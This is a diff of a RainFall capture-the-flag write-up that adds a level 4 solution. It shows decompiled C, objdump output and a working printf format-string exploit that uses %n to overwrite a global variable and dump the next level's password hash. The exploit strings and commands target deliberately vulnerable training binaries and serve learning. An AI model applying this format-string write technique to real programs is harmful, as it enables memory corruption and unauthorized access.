@@ -298,39 +298,6 @@ cat /home/user/level3/.pass
 
 ## level3
 
-```nasm
-(gdb) disas v
-Dump of assembler code for function v:
-   0x080484a4 <+0>:     push   ebp
-   0x080484a5 <+1>:     mov    ebp,esp
-   0x080484a7 <+3>:     sub    esp,0x218
-=> 0x080484ad <+9>:     mov    eax,ds:0x8049860
-   0x080484b2 <+14>:    mov    DWORD PTR [esp+0x8],eax
-   0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200
-   0x080484be <+26>:    lea    eax,[ebp-0x208]
-   0x080484c4 <+32>:    mov    DWORD PTR [esp],eax
-   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
-   0x080484cc <+40>:    lea    eax,[ebp-0x208]
-   0x080484d2 <+46>:    mov    DWORD PTR [esp],eax
-   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
-   0x080484da <+54>:    mov    eax,ds:0x804988c
-   0x080484df <+59>:    cmp    eax,0x40
-   0x080484e2 <+62>:    jne    0x8048518 <v+116>
-   0x080484e4 <+64>:    mov    eax,ds:0x8049880
-   0x080484e9 <+69>:    mov    edx,eax
-   0x080484eb <+71>:    mov    eax,0x8048600
-   0x080484f0 <+76>:    mov    DWORD PTR [esp+0xc],edx
-   0x080484f4 <+80>:    mov    DWORD PTR [esp+0x8],0xc
-   0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1
-   0x08048504 <+96>:    mov    DWORD PTR [esp],eax
-   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
-   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d
-   0x08048513 <+111>:   call   0x80483c0 <system@plt>
-   0x08048518 <+116>:   leave  
-   0x08048519 <+117>:   ret    
-End of assembler dump.
-```
-
 ```c
 int m;
 
@@ -348,7 +315,18 @@ void v() {
 int main() { v(); }
 ```
 
-We have to write 64 at the address 0x0804988c to get the reverse shell.
+```nasm
+(gdb) disas v
+Dump of assembler code for function v:
+[...]
+   0x080484da <+54>:    mov    eax,ds:0x804988c
+   0x080484df <+59>:    cmp    eax,0x40
+   0x080484e2 <+62>:    jne    0x8048518 <v+116>
+[...]  
+End of assembler dump.
+```
+
+We have to write 64 at the address 0x0804988c to get the shell.
 
 The program uses `printf` with the input directly as a format string. This is a well-known vulnerability, since users can write their own format specifiers, causing the leak of information, or in our case, writing values directly to memory.
 
@@ -361,7 +339,7 @@ level3@RainFall:~$ echo '%x %x %x %x %x' | ./level3
 200 b7fd1ac0 b7ff37d0 25207825 78252078
 ```
 
-There are 3 values, then 257820 repeating corresponding to `%x `. So it is found at the 4th position.
+There are 3 values, then `257820` repeating corresponding to `%x `. So it is found at the 4th position.
 
 The trick is to start the format string with the address we want to overwrite, then set %n the 4th format specifier. The rest are padding characters to reach a value of 64.
 
@@ -374,4 +352,51 @@ b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 
 
+
+## level4
+
+This program is similar to the previous one, but the value we must write is much bigger: 16930116
+
+```c
+int m;
+
+int p(char* format) { return printf(format); }
+
+void n() {
+    char s[520];
+    fgets(s, 512, stdin);
+    p(s);
+    if (m == 16930116) system("/bin/cat /home/user/level5/.pass");
+}
+
+int main() { n(); }
+```
+
+We find the address with `objdump`:
+
+```console
+level4@RainFall:~$ objdump -t level4 | grep m
+[...]
+08049810 g     O .bss   00000004              m
+[...]
+```
+
+There are 10 values, then `2578` repeating corresponding to the content of the format string.
+
+```console
+level4@RainFall:~$ echo '%x%x%x%x%x%x%x%x%x%x%x%x%x' | ./level4
+b7ff26b0bffff794b7fd0ff400bffff758804848dbffff550200b7fd1ac0b7ff37d07825782578257825
+```
+
+Using the precision and width modifiers, we can write the exact number of chars that we require. The full payload is:
+- address we want to overwrite (in little-endian)
+- 10 times `%.0s` to skip the stack until the start of the format string, while writing no character.
+- 16930112 (16930116 - the 4 we've written for the address) characters with `%16930112s`
+- `%n` to write the result
+
+```console
+level4@RainFall:~$ python -c "print('\x10\x98\x04\x08%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%16930112s%n')" | ./level4
+...
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
 
